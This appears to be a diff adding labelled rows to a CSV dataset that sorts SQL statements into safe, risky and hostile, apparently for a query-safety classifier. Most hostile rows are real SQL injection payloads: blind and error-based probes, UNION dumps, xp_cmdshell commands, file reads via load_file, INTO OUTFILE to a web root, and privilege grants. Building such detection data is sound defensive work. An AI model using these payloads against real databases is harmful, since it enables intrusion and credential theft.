+693,sl_error_based,hostile,SELECT * FROM accounts WHERE id = 1 AND 3271=getSetting('qjvkq'||(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq')
+694,json_legit,safe,"SELECT id, meta->>'status' FROM orders WHERE meta->>'status' = 'paid' AND id = 5"
+695,sl_boolean_blind,hostile,"SELECT id, code FROM sessions WHERE code = '(3271=3271)*4471"
+696,sl_time_blind,hostile,"SELECT * FROM sessions WHERE (code = 'x'"")) or pg_sleep(5)--"
+697,sl_boolean_blind,hostile,"SELECT id, name FROM products WHERE name = 'ELT(3271=3271,1)"
+698,read_simple,safe,"SELECT amount, title FROM sessions WHERE updated_at >= '2025-12-31' LIMIT 20"
+699,sl_time_blind,hostile,"SELECT * FROM members WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"
+700,read_simple,safe,"SELECT title, id FROM coupons WHERE title = 'Summer Sale' LIMIT 10"
+701,sl_generic,hostile,SELECT * FROM members WHERE id = 1 declare @s varchar (200) select @s = 0x73656c6 ...
+702,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = 'Ã½ or 1=1 --"
+703,sl_generic,hostile,"SELECT id, code FROM products WHERE code = 'admin') or '1'='1"
+704,sl_generic,hostile,"SELECT id, code FROM products WHERE code = 'hi or 1=1 --"""
+705,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = 'reverse(right(reverse(data),1))"
+706,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = 'admin' or '"
+707,sl_oracle,hostile,"SELECT id, code FROM orders WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i"
+708,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = 'insert into users (user_id,first_name) values(18,(select(select{x name}from{x guestbook}limit 1)))#test"
+709,union_based,hostile,"SELECT * FROM products WHERE id = -1 UNION ALL SELECT table_name, column_name FROM information_schema.columns"
+710,sl_stacked,hostile,"SELECT * FROM accounts WHERE id = 1 ;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3271),0),500000000),NULL)"
+711,read_simple,safe,"SELECT email, shop_id FROM orders WHERE updated_at >= '2026-03-15' LIMIT 10"
+712,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or username like char(37);
+713,sl_file_enum,hostile,SELECT * FROM members WHERE id = 1 exec master..xp_cmdshell 'ipconfig+/all'
+714,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = 'root"" or 1=1/*"
+715,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = 'floor(pi()) 3 floor(pi()*pi()+pi()) 13 ceil((pi()+ceil(pi()))*pi()) 23"
+716,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 OR ELT(3271=3271,!SLEEP(5))"
+717,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = 'validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select passwordxxxxfromxxxadmin limit 1)))%23"
+718,write_bounded,safe,DELETE FROM coupons WHERE id = 317 AND amount = 8.00
+719,read_simple,safe,"SELECT shop_id, name FROM users WHERE title = 'VIP Upgrade' LIMIT 50"
+720,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = '@var select @var as var into temp end --"
+721,write_bounded,safe,DELETE FROM carts WHERE id = 9912 AND updated_at >= '2026-03-15'
+722,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1' union distinctrow select 1
+723,write_bounded,safe,UPDATE users SET amount = 250.50 WHERE id = 317
+724,sl_time_blind,hostile,SELECT * FROM orders WHERE (username = 'x'') or sleep(5)='
+725,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 select * from information_schema.tables--
+726,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = 'validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select password from%a0admin limit 1)))%23"
+727,read_simple,safe,"SELECT created_at, status FROM users WHERE name = 'Carol Wu' LIMIT 10"
+728,sl_generic,hostile,"SELECT id, title FROM sessions WHERE title = 'admin'or 1=1 or ''='"
+729,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = 'id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10"
+730,unbounded_write,risky,UPDATE carts SET status = 'refunded'
+731,sl_oracle,hostile,"SELECT id, name FROM members WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i"
+732,unbounded_write,risky,UPDATE sessions SET status = 'cancelled'
+733,schema_change,risky,ALTER TABLE carts MODIFY COLUMN amount VARCHAR(32) NOT NULL
+734,sl_auth_bypass,hostile,"SELECT id, code FROM products WHERE code = 'xxx'and'1'=(select '-- ') union all select 1,2,3"
+735,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR 3271=JSON_EXTRACT('{}','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))||'qpbxq')"
+736,sl_oracle,hostile,"SELECT id, email FROM sessions WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i"
+737,sl_error_based,hostile,"SELECT id, code FROM sessions WHERE code = 'EXP(~(SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))x))"
+738,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'd=1 union/*.1*/select user from%a0admin%23"
+739,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = 'floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T"
+740,sl_error_based,hostile,"SELECT id, username FROM sessions WHERE username = ',(SELECT 3271 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))s), 8446744073709551610, 8446744073709551610)))x)"
+741,legit_risky,risky,ALTER TABLE orders ADD COLUMN refund_reason VARCHAR(255) NULL
+742,schema_change,risky,ALTER TABLE payments MODIFY COLUMN status VARCHAR(32) NOT NULL
+743,sl_generic,hostile,"SELECT id, name FROM members WHERE name = '""&"""
+744,admin_op,risky,SET GLOBAL long_query_time = 500
+745,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'where id=.1union/*.1*/select~.1"
+746,read_simple,safe,"SELECT id, updated_at FROM refunds WHERE id = 100 LIMIT 20"
+747,sl_generic,hostile,"SELECT id, title FROM users WHERE title = 'hi' or 1=1 --"
+748,sl_time_blind,hostile,"SELECT id, code FROM products WHERE code = '(SELECT COUNT(*) FROM SYS.OBJECTS AS T1,SYS.OBJECTS AS T2,SYS.OBJECTS AS T3 WHERE LOWER(T1.OBJECT_NAME)!=UPPER(T2.OBJECT_NAME))"
+749,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = 'hi' or 'x'='x';"
+750,sl_auth_bypass,hostile,"SELECT id, email FROM accounts WHERE email = 'validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update(select(select{x%0acomment}from{x%0aguestbook}limit 1))%23"
+751,sl_auth_bypass,hostile,"SELECT id, title FROM sessions WHERE title = 'id=/*!SELECT*//*!CONCAT*/(0x7176626a71,(MID((/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),0x20)),1,50)),0x7170767871)"
+752,oob_rce,hostile,EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
+753,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = 'root"" or 1=1--"
+754,sl_error_based,hostile,SELECT * FROM users WHERE id = 1 AND 3271=UTL_INADDR.GET_HOST_ADDRESS('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq')
+755,admin_op,risky,GRANT DELETE ON coupons.* TO 'migration'@'%'
+756,blind_time,hostile,SELECT pg_sleep(10)
+757,sl_mysql,hostile,SELECT * FROM accounts WHERE id = 1' or '1'='1
+758,sl_mssql,hostile,"SELECT id, name FROM accounts WHERE name = ''create user name identified by 'pass123' --"
+759,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'id=49 %u0061nd 1=1"
+760,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or a=a--
+761,unbounded_write,risky,UPDATE shops SET title = 'Summer Sale'
+762,sl_error_based,hostile,"SELECT id, name FROM sessions WHERE name = '(EXTRACTVALUE(3271,CONCAT('\','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq')))"
+763,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM orders a JOIN coupons b ON b.shop_id = a.id WHERE a.amount = 19.99 GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+764,read_simple,safe,"SELECT title, user_id FROM products WHERE title = 'Summer Sale' LIMIT 100"
+765,sl_time_blind,hostile,SELECT * FROM users WHERE id = 1 OR 3271=(SELECT SLEEP(5) FROM db_root)
+766,sl_generic,hostile,"SELECT * FROM orders WHERE id = 1 and 1=( if((load_file(char(110,46,101,120,11 ..."
+767,sl_generic,hostile,"SELECT id, title FROM users WHERE title = '' or 1 --'"
+768,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = 'root' or '1'='1'/*"
+769,sl_time_blind,hostile,"SELECT id, title FROM sessions WHERE title = ',(SELECT (CASE WHEN (3271=3271) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END))"
+770,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM payments a JOIN products b ON b.shop_id = a.id WHERE a.updated_at >= '2026-08-20' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+771,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1 UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)
+772,admin_op,risky,REVOKE DROP ON payments FROM 'analytics'@'%'
+773,schema_change,risky,ALTER TABLE carts DROP COLUMN title
+774,sl_generic,hostile,"SELECT id, email FROM products WHERE email = '' or true--"
+775,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = 'extractvalue(floor(0),concat(0x0a,version()))"
+776,sl_file_enum,hostile,SELECT * FROM users WHERE id = 1 select @@microsoftversione
+777,schema_change,risky,TRUNCATE TABLE products
+778,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = '' or 0=0 --"
+779,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 or 'a'='a
+780,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1) or pg_sleep(5)--
+781,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = 'true !!pi() 1 ceil(pi()*pi())+true 11 ceil(ceil(pi())*version()) 21"
+782,sl_boolean_blind,hostile,"SELECT * FROM sessions WHERE id = 1 ,IIF(3271=3271,1,1/0)"
+783,admin_op,risky,REVOKE INSERT ON payments FROM 'analytics'@'%'
+784,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM coupons a JOIN users b ON b.user_id = a.id WHERE a.title = 'Free Shipping' GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+785,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = '' or ''^'"
+786,sl_auth_bypass,hostile,"SELECT id, email FROM accounts WHERE email = 'id='select xx /*from*/``%23"
+787,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 OR ROW(3271,4471)>(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM (SELECT 8812 UNION SELECT 1 UNION SELECT 1 UNION SELECT 1)a GROUP BY x)"
+788,read_simple,safe,"SELECT amount, created_at FROM shops WHERE created_at >= '2026-01-01' LIMIT 20"
+789,sl_time_blind,hostile,"SELECT * FROM products WHERE (email = 'x'"");waitfor delay '0:0:5'--"
+790,sl_time_blind,hostile,"SELECT id, username FROM sessions WHERE username = '(SELECT 3271 FROM PG_SLEEP(5))"
+791,read_simple,safe,"SELECT status, amount FROM coupons WHERE name = 'Daniel Ma' LIMIT 10"
+792,unbounded_write,risky,UPDATE shops SET amount = 8.00
+793,sl_oracle,hostile,"SELECT id, name FROM accounts WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i"
+794,schema_change,risky,ALTER TABLE carts MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+795,sl_oracle,hostile,"SELECT id, title FROM products WHERE title = '' or '1'='1"
+796,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM payments a JOIN carts b ON b.user_id = a.id WHERE a.email = 'alice@example.com' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+797,sl_auth_bypass,hostile,"SELECT id, title FROM accounts WHERE title = 'root' or 1=1#"
+798,sl_time_blind,hostile,"SELECT id, name FROM sessions WHERE name = '%20'sleep%2050'"
+799,write_bounded,safe,UPDATE orders SET title = 'VIP Upgrade' WHERE id = 42
+800,sl_boolean_blind,hostile,SELECT * FROM orders WHERE id = 1 OR (SELECT (CASE WHEN (3271=3271) THEN NULL ELSE CAST(''qxjkp'' AS NUMERIC) END)) IS NULL
+801,sl_mssql,hostile,"SELECT id, code FROM sessions WHERE code = '' grant connect to name; grant resource to name; --"
+802,read_simple,safe,"SELECT id, shop_id FROM refunds WHERE email = 'carol@mail.com' LIMIT 50"
+803,read_join_agg,safe,"SELECT a.email, COUNT(b.id) AS cnt FROM refunds a JOIN coupons b ON b.user_id = a.id WHERE a.user_id = 1204 GROUP BY a.email ORDER BY cnt DESC LIMIT 50"
+804,schema_change,risky,ALTER TABLE carts MODIFY COLUMN user_id VARCHAR(32) NOT NULL
+805,sl_auth_bypass,hostile,"SELECT * FROM sessions WHERE id = 1' union distinctrow select/*!USER*/(),/*!DATABASE*/()#"
+806,data_exfil,hostile,"SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%'"
+807,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 or '7659'='7659
+808,sl_auth_bypass,hostile,"SELECT * FROM accounts WHERE id = 1234 "" AND 1=0 UNION ALL SELECT ""root"", ""81dc9bdb52d04dc20036dbd8313ed055"
+809,sl_generic,hostile,SELECT * FROM products WHERE id = 1 declare @s varchar(22) select @s =
+810,admin_op,risky,REVOKE DROP ON payments FROM 'ops'@'%'
+811,write_bounded,safe,"INSERT INTO orders (amount, updated_at) VALUES (19.99, '2026-08-20')"
+812,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 AND ''qxjkp''=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3271),0),5000000000),NULL)"
+813,legit_risky,risky,UPDATE users SET status = 'inactive' WHERE last_login < '2024-01-01'
+814,unbounded_write,risky,UPDATE orders SET title = 'Free Shipping'
+815,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(3271,CONCAT('\','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'))"
+816,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 AND 3271 IN (SELECT ('qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq'))
+817,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = 'root' or '1'='1'--"
+818,schema_change,risky,ALTER TABLE coupons DROP COLUMN title
+819,sl_boolean_blind,hostile,"SELECT * FROM accounts WHERE id = 1 ;IIF(3271=3271,1,1/0)"
+820,write_bounded,safe,UPDATE shops SET amount = 100.00 WHERE id = 2048
+821,admin_op,risky,SET GLOBAL foreign_key_checks = 500
+822,sl_time_blind,hostile,"SELECT id, email FROM products WHERE email = '(CASE WHEN (3271=3271) THEN (SELECT BENCHMARK(5000000,MD5(''qxjkp''))) ELSE 3271)"
+823,sl_generic,hostile,"SELECT id, title FROM products WHERE title = '*(|(mail=*))"
+824,sl_time_blind,hostile,"SELECT * FROM orders WHERE (name = 'x'""));waitfor delay '0:0:5'--"
+825,sl_inline_query,hostile,"SELECT id, code FROM members WHERE code = '(SELECT CONCAT(CONCAT('qjvkq',(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'qpbxq'))"
+826,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = '' and substring(data,1,1) = 'a'#"
+827,sl_mssql,hostile,"SELECT id, code FROM members WHERE code = '' union (select NULL, (select @@version)) --"
+828,admin_op,risky,REVOKE INSERT ON refunds FROM 'ops'@'%'
+829,read_simple,safe,"SELECT amount, user_id FROM orders WHERE id = 42 LIMIT 10"
+830,sl_boolean_blind,hostile,"SELECT * FROM sessions WHERE id = 1 AND EXTRACTVALUE(3271,CASE WHEN (3271=3271) THEN 3271 ELSE 0x3A END)"
+831,sl_generic,hostile,"SELECT id, title FROM accounts WHERE title = 'password:*/=1--"
+832,unbounded_write,risky,UPDATE users SET updated_at = '2025-12-31'
+833,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 or (EXISTS)
+834,legit_risky,risky,GRANT SELECT ON analytics.* TO 'bi_reader'@'10.0.%'
+835,read_simple,safe,"SELECT amount, id FROM refunds WHERE status = 'refunded' LIMIT 20"
+836,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1 select{x pwd}from{x %23@admin}limit 1)
+837,sl_error_based,hostile,SELECT * FROM orders WHERE id = 1 OR 3271=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'||CHR(62))) FROM DUAL)
+838,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = '.and 0=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--"
+839,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 AND 3271=PARSE_DATA_SIZE('qjvkq'||CAST((SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END)) AS VARCHAR)||'qpbxq')
+840,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = '?act=buy&id=1%0AAND 1=user"
+841,unbounded_write,risky,UPDATE reviews SET updated_at = '2025-12-31'
+842,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = ''%20or%201=1"
+843,sl_mssql,hostile,"SELECT id, title FROM accounts WHERE title = '' exec sp_addsrvrolemember 'name' , 'sysadmin' --"
+844,sl_boolean_blind,hostile,"SELECT id, email FROM members WHERE email = 'ELT(3271=3271,4471)"
+845,sl_generic,hostile,"SELECT id, code FROM users WHERE code = '' or 1=1--"
+846,data_exfil,hostile,SELECT * FROM pg_shadow
+847,sl_mssql,hostile,"SELECT id, username FROM users WHERE username = '' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --"
+848,sl_auth_bypass,hostile,"SELECT * FROM products WHERE id = 1 union select (select{x user}from{1d admin}+limit+1),1"
+849,unbounded_write,risky,UPDATE carts SET amount = 100.00
+850,sl_auth_bypass,hostile,SELECT * FROM users WHERE id = 1' u%u006eion se%u006cect 1 (iis asp)
+851,write_bounded,safe,"INSERT INTO refunds (created_at, amount) VALUES ('2026-01-01', 1299.00)"
+852,schema_change,risky,ALTER TABLE shops DROP COLUMN name
+853,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM coupons a JOIN payments b ON b.shop_id = a.id WHERE a.id = 9912 GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+854,sl_generic,hostile,"SELECT id, email FROM products WHERE email = '' or '' '"
+855,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 ;BEGIN USER_LOCK.SLEEP(5); END
+856,schema_change,risky,ALTER TABLE users DROP COLUMN created_at
+857,sl_union,hostile,SELECT * FROM members WHERE id = 1 union select * from users where login = char ...
+858,admin_op,risky,REVOKE DROP ON refunds FROM 'migration'@'%'
+859,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'where id=.1union/*.1*/select`host`from mysql.user"
+860,admin_op,risky,REVOKE SELECT ON orders FROM 'etl'@'%'
+861,unbounded_write,risky,UPDATE users SET title = 'Welcome Coupon'
+862,sl_union,hostile,"SELECT id, name FROM accounts WHERE name = '' UNION ALL SELECT"
+863,read_simple,safe,"SELECT user_id, name FROM payments WHERE status = 'paid' LIMIT 20"
+864,sl_error_based,hostile,SELECT * FROM accounts WHERE id = 1 AND 3271=DBMS_UTILITY.SQLID_TO_SQLHASH(('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'))
+865,schema_change,risky,ALTER TABLE products MODIFY COLUMN id VARCHAR(32) NOT NULL
+866,waf_comment,hostile,"SELECT * FROM news WHERE id = 1 UN/**/ION SE/**/LECT 1,2,3"
+867,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1 OR 3271=DBMS_PIPE.RECEIVE_MESSAGE(''qxjkp'',5)"
+868,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM users a JOIN refunds b ON b.user_id = a.id WHERE a.name = 'Bob Lee' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+869,read_simple,safe,"SELECT updated_at, user_id FROM payments WHERE title = 'Summer Sale' LIMIT 50"
+870,sl_auth_bypass,hostile,"SELECT id, name FROM members WHERE name = 'root' #"
+871,sl_oracle,hostile,"SELECT id, email FROM accounts WHERE email = '’ or ‘1’=’1"
+872,read_simple,safe,"SELECT id, name FROM coupons WHERE id = 100 LIMIT 10"
+873,sl_boolean_blind,hostile,"SELECT id, username FROM orders WHERE username = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 1/(SELECT 0) END))"
+874,write_bounded,safe,DELETE FROM carts WHERE id = 317 AND user_id = 3
+875,sl_error_based,hostile,SELECT * FROM users WHERE id = 1 AND 3271=('qjvkq'||(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq')
+876,sl_auth_bypass,hostile,SELECT * FROM members WHERE id = 1' union/**)*/select/**)*/1
+877,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 ,UPDATEXML(3271,CONCAT('.','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),4471)"
+878,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 AND 3271=ZEROIFNULL(CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'qpbxq' AS NUMERIC))
+879,write_bounded,safe,"INSERT INTO reviews (status, updated_at) VALUES ('active', '2026-08-20')"
+880,read_simple,safe,"SELECT shop_id, amount FROM orders WHERE user_id = 1204 LIMIT 100"
+881,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 OR 3271=CONVERT(INT,(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq'))"
+882,sl_boolean_blind,hostile,"SELECT id, name FROM products WHERE name = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 FROM INFORMATION_SCHEMA.PLUGINS) END))"
+883,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM products a JOIN orders b ON b.shop_id = a.id WHERE a.email = 'alice@example.com' GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+884,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))s), 8446744073709551610, 8446744073709551610)))"
+885,schema_change,risky,ALTER TABLE orders DROP COLUMN created_at
+886,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 or pg_sleep(5)--
+887,sl_time_blind,hostile,"SELECT * FROM accounts WHERE (title = 'x'"")) or benchmark(10000000,MD5(1))#"
+888,admin_op,risky,GRANT DROP ON payments.* TO 'app'@'%'
+889,sl_inline_query,hostile,"SELECT id, title FROM products WHERE title = '(SELECT CONCAT('qjvkq',(ELT(3271=3271,1)),'qpbxq'))"
+890,sl_error_based,hostile,"SELECT id, username FROM products WHERE username = 'RAISE_ERROR('70001','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'qpbxq')"
+891,auth_bypass,hostile,SELECT * FROM users WHERE user = '' OR 1=1--' AND pass = ''
+892,read_simple,safe,"SELECT amount, title FROM orders WHERE updated_at >= '2026-03-15' LIMIT 20"
+893,sl_time_blind,hostile,"SELECT * FROM orders WHERE id = 1 AND 3271=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+894,sl_auth_bypass,hostile,SELECT * FROM sessions WHERE id = 1' u%nion se%lect 1 (iis asp)
+895,admin_op,risky,GRANT ALL PRIVILEGES ON coupons.* TO 'ops'@'%'
+896,sl_generic,hostile,"SELECT id, email FROM products WHERE email = '"" """
+897,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM coupons a JOIN reviews b ON b.shop_id = a.id WHERE a.email = 'bob@shop.io' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+898,sl_oracle,hostile,"SELECT id, name FROM sessions WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i"
+899,sl_generic,hostile,"SELECT id, code FROM sessions WHERE code = 'anything' OR 'x'='x"
+900,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = 't'exec master..xp_cmdshell 'nslookup www.googl ..."
+901,write_bounded,safe,"INSERT INTO orders (name, email) VALUES ('Carol Wu', 'bob@shop.io')"
+902,sl_boolean_blind,hostile,"SELECT id, title FROM sessions WHERE title = '(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE 1/(SELECT 0) END))"
+903,sl_union,hostile,SELECT * FROM members WHERE id = 1 UNION ALL SELECT
+904,write_bounded,safe,UPDATE reviews SET updated_at = '2026-03-15' WHERE id = 9912
+905,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = 'root') or ('1'='1'/*"
+906,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = 'id=49 %u0061nd 1=2"
+907,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM carts a JOIN sessions b ON b.shop_id = a.id WHERE a.id = 1 GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+908,schema_change,risky,ALTER TABLE reviews DROP COLUMN updated_at
+909,sl_oracle,hostile,"SELECT id, title FROM users WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i"
+910,sl_time_blind,hostile,"SELECT id, code FROM sessions WHERE code = 'pg_sleep(5)--"
+911,sl_generic,hostile,"SELECT id, name FROM products WHERE name = 'admin"") or ""1""=""1""/*"
+912,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'id=2/*/*/union/*/*/select/*/*/from/*/*/1,2,3"
+913,oob_rce,hostile,SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt'
+914,write_bounded,safe,UPDATE carts SET status = 'refunded' WHERE id = 100
+915,read_simple,safe,"SELECT status, amount FROM coupons WHERE created_at >= '2026-06-30' LIMIT 20"
+916,sl_generic,hostile,"SELECT id, name FROM users WHERE name = 'admin' or '1'='1"
+917,sl_oracle,hostile,"SELECT id, username FROM users WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i"
+918,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 OR 3271=ROTATELEFT(CAST('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq' AS INT),1)"
+919,sl_generic,hostile,"SELECT id, title FROM products WHERE title = 'admin' or '1'='1'--"
+920,sl_generic,hostile,"SELECT * FROM orders WHERE id = 1;(load_file(char(47,101,116,99,47,112,97,115, ..."
+921,schema_change,risky,ALTER TABLE refunds MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+922,sl_generic,hostile,SELECT * FROM users WHERE id = 1 declare @q nvarchar (200) select @q = 0x770061 ...
